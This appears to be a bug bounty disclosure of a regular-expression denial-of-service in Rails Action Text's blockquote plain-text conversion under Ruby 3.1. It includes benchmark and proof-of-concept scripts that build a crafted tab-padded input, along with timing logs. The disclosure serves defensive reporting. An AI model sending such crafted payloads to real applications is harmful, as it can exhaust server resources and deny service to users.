title: Action Text ReDoS (Ruby 3.1  or lower)
vulnerability_information:
I have found ReDoS in Action Text. However, it does not occur with Ruby 3.2 or later. https://github.com/rails/rails/blob/v7.1.3.2/actiontext/lib/action_text/plain_text_conversion.rb#L64 ```ruby def plain_text_for_blockquote_node(node, index) text = plain_text_for_block(node) text.sub(/\A(\s*)(.+?)(\s*)\Z/m, '\1“\2”\3') end ``` This is used in `ActionText::Fragment#to_plain_text`. https://github.com/rails/rails/blob/v7.1.3.2/actiontext/lib/action_text/fragment.rb#L47 It is a detect result by recheck ( https://makenowjust-labs.github.io/recheck/ ). {F3078833} --- Confirm ReDoS with `plain_text_regexp_benchmark.rb` ```ruby require 'benchmark' def plain(length) text = "\t" * length + "a" + "\t" * length + "a" text.sub(/\A(\s*)(.+?)(\s*)\Z/m, '\1“\2”\3') end Benchmark.bm do |x| x.report { plain(10) } x.report { plain(100) } x.report { plain(1000) } x.report { plain(10000) } x.report { plain(100000) } end ``` ```log # ruby 3.1.4 ❯ ruby plain_text_regexp_benchmark.rb user system total real 0.000008 0.000001 0.000009 ( 0.000007) 0.000055 0.000001 0.000056 ( 0.000055) 0.004528 0.000003 0.004531 ( 0.004534) 0.385151 0.000659 0.385810 ( 0.386042) 39.185124 0.129945 39.315069 ( 39.408578) # ruby 3.2.3 ❯ ruby plain_text_regexp_benchmark.rb user system total real 0.000008 0.000001 0.000009 ( 0.000007) 0.000010 0.000001 0.000011 ( 0.000012) 0.000060 0.000022 0.000082 ( 0.000098) 0.000549 0.000064 0.000613 ( 0.000613) 0.005388 0.001199 0.006587 ( 0.006598) # ruby 3.3.0 ❯ ruby plain_text_regexp_benchmark.rb user system total real 0.000011 0.000001 0.000012 ( 0.000008) 0.000073 0.000001 0.000074 ( 0.000073) 0.000110 0.000011 0.000121 ( 0.000122) 0.001089 0.000196 0.001285 ( 0.001285) 0.010387 0.001831 0.012218 ( 0.012250) ``` --- ### PoC ```log ❯ rails new -C -G -T text # => Rails 7.1.3.2 ❯ rails action_text:install ❯ bundle install ❯ bundle exec bin/rails generate model Message content:rich_text ❯ bundle exec rails db:migrate ``` create `plain_text_benchmark.rb` ```ruby require 'benchmark' def plain(length) text = "\t" * length + "a" + "\t" * length + "a" message = Message.create!(content: "
#{text}
") message.content.to_plain_text end Benchmark.bm do |x| x.report { plain(10) } x.report { plain(100) } x.report { plain(1000) } x.report { plain(10000) } x.report { plain(100000) } end ``` ```log # ruby 3.1.4 ❯ bundle exec rails runner plain_text_benchmark.rb user system total real 0.031610 0.010543 0.042153 ( 0.046888) 0.003494 0.000228 0.003722 ( 0.003872) 0.007226 0.000156 0.007382 ( 0.007383) 0.396392 0.001231 0.397623 ( 0.398462) 39.107745 0.110123 39.217868 ( 39.334358) ``` ## Impact When using ActionText under Ruby 3.1, it is ReDoS if crafted text is sent and `to_plain_text` is called. The same regular expressions are used in Rails 6.1 and 7.0. - https://github.com/rails/rails/blob/v6.1.7.7/actiontext/lib/action_text/plain_text_conversion.rb#L58 - https://github.com/rails/rails/blob/v7.0.8.1/actiontext/lib/action_text/plain_text_conversion.rb#L66
